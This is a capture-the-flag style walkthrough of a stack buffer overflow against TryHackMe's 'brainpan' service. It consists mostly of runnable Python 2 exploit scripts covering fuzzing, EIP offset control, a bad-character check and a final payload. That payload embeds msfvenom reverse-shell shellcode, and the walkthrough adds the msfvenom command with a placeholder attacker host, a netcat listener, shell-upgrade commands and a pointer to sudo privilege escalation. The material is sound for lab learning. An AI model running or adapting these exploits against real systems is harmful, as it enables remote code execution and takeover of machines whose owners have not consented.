BoF when EXE is on Linux
***************************

Intro
#######
**This is based on Try Hack Me's brainpan**

Run an nmap scan and try to find the program port. Try and see if you can download it via website or smb.

Then you can create a script to fuzz the program. This is a python2 script of that. Whenever the program breaks, that number of bytes is when you need to attack. 

Once you download the program, put it in a Windows test environment, and launch the program using Immunity Debugger.

Fuzzer
#########

In brainpan, this crashes the program at 600 bytes.

.. code-block:: console

        #!/usr/bin/python

        import socket, time, sys

        size = 100

        while(size < 2500):

                try:

                        print(("\nSending evil buffer with %s bytes" % size))
                        buffer = "A" * size
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ip= "10.0.0.178"
                        s.connect((ip, 9999))
                        s.send(buffer)
                        s.close()
                        size +=100
                        time.sleep(3)
                except:
                        print("\nCould not connect!")

                        sys.exit()

EUPoff1.py
##############

This results in using msf-pattern_create like so:

.. code-block:: console

   msf-pattern_create -l 600

You then create a file called whatever you want. I called it EIPoff.py . This is in python2

.. code-block:: console

        #!/usr/bin/python
        import os,socket
        try:
                print "[+] \nSending evil buffer..."
                buffer = <output of msf-pattern_create>
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                ip = "Victim Machine IP"
                s.connect((ip, 9999))
                s.send(buffer)
                s.close()
                print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
                print "\n[+] Sending buffer: " + buffer
                print "\n[+] Done!"
        except:
                print "\n[+] Could not connect!"

You should see in Immunity Debugger that the EIP is a different number. In this case our `EIP is 35724134`


You than run `msf-patter_offset` for the second script. In this case it looks like this

.. code-block:: console

   msf-pattern_offset -l 600 -q <EIP_number>

This should match up with an offset. In this case the offset is 524.

You then make a second EIPoff by creating a python script named EIPoff2.py. Should look similar to this

.. code-block:: console

        #!/usr/bin/python
        import os,socket
        try:
                print "[+] \nSending evil buffer..."
                offset = "A" * 524
                eip = "B" * 4
                buffer = offset + eip
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                ip = "10.0.0.178"
                s.connect((ip, 9999))
                s.send(buffer)
                s.close()
                print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
                print "\n[+] Sending buffer: " + buffer
                print "\n[+] Done!"
        except:
                print "\n[+] Could not connect!"

Rerun the script in Immunity Debugger, and then run the script above. You should see an output in `EIP of 42424242`. This means the 4 B's are in the EIP. 
                
EIPoff3.py
#################

The purpose of the below is to see if there is enough space for shellcode after EIP.

You then add this line after the eip variable from the previous script

.. code-block:: console

       shellcode = "C" * (1000 - len(offset) - len(eip))

You then change the buffer variable to look like this 

.. code-block:: console

        buffer = offset + eip + shellcode 

The `EDX` should show a lot of A's and the `ESP` should show a lot of C's.        
EIPoff4.py Bad Characters
##############################

Now we need to figure out the bad characters. In this case their is no bad characters. If there were, you would eliminate then from the badchars list. An example of how to check would be from the following below. This is a python2 script

.. code-block:: console

        import os,socket 
        badchars = ( 
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10" 
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
        "\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30" 
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40" 
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) 
        
        try: 
                print "[+] \nSending evil buffer..." 
                offset = "A" * 524 
                eip = "B" * 4 
                buffer = offset + eip + badchars 
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) 
                ip = "10.0.0.178" 
                s.connect((ip, 9999)) 
                s.send(buffer) 
                s.close() 
                print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..." 
                print "\n[+] Sending buffer: " + buffer 
                print "\n[+] Done!" 
        except: 
                print "\n[+] Could not connect!" 

Mona
#####

In Immunity Debugger you would run this to find a valid dll/module

.. code-block:: console

   !mona modules

In the top left field in Immunity Debuger scroll down to find JMP ESP. The number in our case is 311712F3.

msfvenom
###########

You now run msfvenom to create the shell. It should look something like this

.. code-block:: console

   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker port> -f python -b "\x00"

EIPoff5.py
############

You then create a new file by copying the last one you did. It should look similar to this. Look at the script below to see where you put the stuff.

.. code-block:: console

        import os,socket
        #from msfvenom
        buf =  b""
        buf += b"\xb8\x4e\x7e\x59\x6d\xda\xd5\xd9\x74\x24\xf4\x5e\x33"
        buf += b"\xc9\xb1\x12\x31\x46\x12\x83\xee\xfc\x03\x08\x70\xbb"
        buf += b"\x98\xa5\x57\xcc\x80\x96\x24\x60\x2d\x1a\x22\x67\x01"
        buf += b"\x7c\xf9\xe8\xf1\xd9\xb1\xd6\x38\x59\xf8\x51\x3a\x31"
        buf += b"\xf1\xa3\xae\xd5\x6d\xa6\xce\xc4\x31\x2f\x2f\x56\xaf"
        buf += b"\x7f\xe1\xc5\x83\x83\x88\x08\x2e\x03\xd8\xa2\xdf\x2b"
        buf += b"\xae\x5a\x48\x1b\x7f\xf8\xe1\xea\x9c\xae\xa2\x65\x83"
        buf += b"\xfe\x4e\xbb\xc4"
        try:
                print "[+] \nSending evil buffer..."
                offset = "A" * 524
                # from JMP ESP number. You do it backwards
                eip = "\xf3\x12\x17\x31"
                # you do nops to avoid erros during decoding
                nops = "\x90" * 10
                buffer = offset + eip + nops + buf
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                ip = "10.0.0.178"
                s.connect((ip, 9999))
                s.send(buffer)
                s.close()
                print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
                print "\n[+] Sending buffer: " + buffer
                print "\n[+] Done!"

        except:
                print "\n[+] Could not connect!"

Shell
#######

You then run a netcat shell like this to get a shell. Run the commands after the netcat command to get an interactive TTY shell.

.. code-block:: console

        nc -lvnp 4444
        python -c 'import pty; pty.spawn("/bin/sh")'
        bash -i

Use `sudo -l` to find commands that have sudo privileges. Then exploit it to get root        

        
